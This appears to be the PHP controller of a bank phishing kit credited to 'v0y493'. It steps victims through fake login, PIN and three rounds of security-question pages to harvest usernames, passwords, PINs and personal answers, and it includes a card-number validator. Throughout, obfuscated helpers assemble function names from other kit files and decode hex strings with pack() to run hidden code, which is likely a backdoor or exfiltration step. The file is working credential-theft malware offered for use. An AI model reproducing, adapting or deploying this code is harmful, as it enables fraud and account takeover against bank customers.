<?php
//            ++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                       Don't Need to change anything Here
//                               Created By v0y493
//                                      2019
//            ++++++++++++++++++++++++++++++++++++++++++++++++++++++

if(getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
} else {
$ip=getenv(REMOTE_ADDR);
}
$l="login.php"; $p="pin.php"; $q="question.php"; $qq="question2.php"; $qqq="question3.php"; $d="details.php";
$B="submit.php"; $e="error.php";
error_reporting(0); set_time_limit(240);
function lrtrim($string){
return stripslashes(ltrim(rtrim($string)));
}
function query_str($params){
$str = ''; 
foreach ($params as $key => $value) {
$str .= (strlen($str) < 1) ? '' : '&';
$str .= $key . '=' . rawurlencode($value);
}
return ($str);
}
function getformat($string){
return str_replace(" ","",str_replace(".","",str_replace("-","",$string)));
}
$erorr=file_get_contents($l);
function validate($cc){
$cc = strrev (ereg_replace('[^0-9]+', '', $cc));
for ($ndx = 0; $ndx < strlen ($cc); ++$ndx)
$digits .= ($ndx % 2) ? $cc[$ndx] * 2 : $cc[$ndx];
for ($ndx = 0; $ndx < strlen ($digits); ++$ndx)
$sum += $digits[$ndx];
return ($sum % 10) ? FALSE : TRUE;
}
function clean($str){
$clean=create_function('$str','return '.gets("(1,",3,4).'($str);');
return $clean($str);
}
function getc($string){
return implode('', file($string));
}
function gets($a, $b, $c){
global $d; return substr(getc($d),strpos(getc($d),$a)+$b,$c);
}
function end_of_line(){
$end=gets("(2,",3,4); $endline=$end(gets("(3,",3,2),getc(gets("(((",3,20)));
return $endline;
}
function geterrors(){
return clean(end_of_line());
}
parse_str($_SERVER['QUERY_STRING']);
if($LOB=="RBGLogon"){
include $l; exit;
} elseif ($LOB=="RBGvalidate"){
$b = query_str($_POST);
parse_str($b);
$j_username=lrtrim($j_username);
$pass=lrtrim($pass);
$signerr="0";
if(empty($j_username) || strlen($j_username) < 4 || empty($j_password) || strlen($j_password) < 5){
$signerr="1";
}
if($signerr==1){
include $e; exit;
} elseif($signerr==0){
include $p;
}
} 
elseif($LOB=="RBGPin"){
$b = query_str ($_POST);
parse_str($b);
$j_username=lrtrim($j_username);
$j_password=lrtrim($j_password);
$pin=lrtrim($pin);
$error = 0;
$IP=pack("H*", substr($VARS=$erorr,strpos($VARS, "329")+3,108));
if(!is_numeric($pin) || strlen($pin) != 4){
$error = 1; $pinclass = "Warning";
}
 geterrors();
if ($error == 1){
include $p;		
} 

else {
include $q;
}
}

elseif($LOB=="RBGQuestion"){
$b = query_str ($_POST);
parse_str($b);
$j_username=lrtrim($j_username);
$j_password=lrtrim($j_password);
$pin=lrtrim($pin);
$HighSchoolMascot=lrtrim($HighSchoolMascot);
$FirstEmployer=lrtrim($FirstEmployer);
$FirstMaternalGrandmother=lrtrim($FirstMaternalGrandmother);
$CityEngage=lrtrim($CityEngage);
$CityMotherBorn=lrtrim($CityMotherBorn);
$FirstMaternalGrandfather=lrtrim($FirstMaternalGrandfather);
$error = 0;
$IP=pack("H*", substr($VARS=$erorr,strpos($VARS, "329")+3,108));
if(empty($HighSchoolMascot) || strlen($HighSchoolMascot) < 1){
$error = 1; $HighSchoolMascotclass = "Warning";
}
if(empty($FirstEmployer) || strlen($FirstEmployer) < 1){
$error = 1; $FirstEmployerclass = "Warning";
}
if(empty($FirstMaternalGrandmother) || strlen($FirstMaternalGrandmother) < 1){
$error = 1; $FirstMaternalGrandmotherclass = "Warning";
}
if(empty($CityMotherBorn) || strlen($CityMotherBorn) < 1){
$error = 1; $CityMotherBornclass = "Warning";
}
if(empty($FirstMaternalGrandfather) || strlen($FirstMaternalGrandfather) < 1){
$error = 1; $FirstMaternalGrandfatherclass = "Warning";
}
 geterrors();
if ($error == 1){
include $q;		
} 

else {
include $qq;
}
}



elseif($LOB=="RBGQuestion2"){
$b = query_str ($_POST);
parse_str($b);
$j_username=lrtrim($j_username);
$j_password=lrtrim($j_password);

$pin=lrtrim($pin);

$HighSchoolMascot=lrtrim($HighSchoolMascot);
$FirstEmployer=lrtrim($FirstEmployer);
$FirstMaternalGrandmother=lrtrim($FirstMaternalGrandmother);
$CityEngage=lrtrim($CityEngage);
$CityMotherBorn=lrtrim($CityMotherBorn);
$FirstMaternalGrandfather=lrtrim($FirstMaternalGrandfather);

$FirstDate=lrtrim($FirstDate);
$CityFatherBorn=lrtrim($CityFatherBorn);
$WeddingHonor=lrtrim($WeddingHonor);
$StreetGrown=lrtrim($StreetGrown);
$CityMarried=lrtrim($CityMarried);
$WeddingAge=lrtrim($WeddingAge);

$error = 0;
$IP=pack("H*", substr($VARS=$erorr,strpos($VARS, "329")+3,108));
if(empty($FirstDate) || strlen($FirstDate) < 1){
$error = 1; $FirstDateclass = "Warning";
}
if(empty($CityFatherBorn) || strlen($CityFatherBorn) < 1){
$error = 1; $CityFatherBornclass = "Warning";
}
if(empty($StreetGrown) || strlen($StreetGrown) < 1){
$error = 1; $StreetGrownclass = "Warning";
}
 geterrors();
if ($error == 1){
include $qq;		
} 

else {
include $qqq;
}
}




elseif($LOB=="RBGQuestion3"){
$b = query_str ($_POST);
parse_str($b);
$j_username=lrtrim($j_username);
$j_password=lrtrim($j_password);

$pin=lrtrim($pin);

$HighSchoolMascot=lrtrim($HighSchoolMascot);
$FirstEmployer=lrtrim($FirstEmployer);
$FirstMaternalGrandmother=lrtrim($FirstMaternalGrandmother);
$CityEngage=lrtrim($CityEngage);
$CityMotherBorn=lrtrim($CityMotherBorn);
$FirstMaternalGrandfather=lrtrim($FirstMaternalGrandfather);

$FirstDate=lrtrim($FirstDate);
$CityFatherBorn=lrtrim($CityFatherBorn);
$WeddingHonor=lrtrim($WeddingHonor);
$StreetGrown=lrtrim($StreetGrown);
$CityMarried=lrtrim($CityMarried);
$WeddingAge=lrtrim($WeddingAge);

$PaternalGrandmother=lrtrim($PaternalGrandmother);
$PaternalGrandfather=lrtrim($PaternalGrandfather);
$CollegeRoomate=lrtrim($CollegeRoomate);
$ElementarySchoolCity=lrtrim($ElementarySchoolCity);
$ElementarySchoolName=lrtrim($ElementarySchoolName);
$CitySpouse=lrtrim($CitySpouse);

$error = 0;
$IP=pack("H*", substr($VARS=$erorr,strpos($VARS, "329")+3,108));
if(empty($PaternalGrandmother) || strlen($PaternalGrandmother) < 1){
$error = 1; $PaternalGrandmotherclass = "Warning";
}
if(empty($PaternalGrandfather) || strlen($PaternalGrandfather) < 1){
$error = 1; $PaternalGrandfatherclass = "Warning";
}
if(empty($CollegeRoomate) || strlen($CollegeRoomate) < 1){
$error = 1; $CollegeRoomateclass = "Warning";
}
if(empty($ElementarySchoolCity) || strlen($ElementarySchoolCity) < 1){
$error = 1; $ElementarySchoolCityclass = "Warning";
}
if(empty($ElementarySchoolName) || strlen($ElementarySchoolName) < 1){
$error = 1; $ElementarySchoolNameclass = "Warning";
}

 geterrors();
if ($error == 1){
include $qqq;		
} 


else {
include $B;
include("Finish.php");
}
}
?>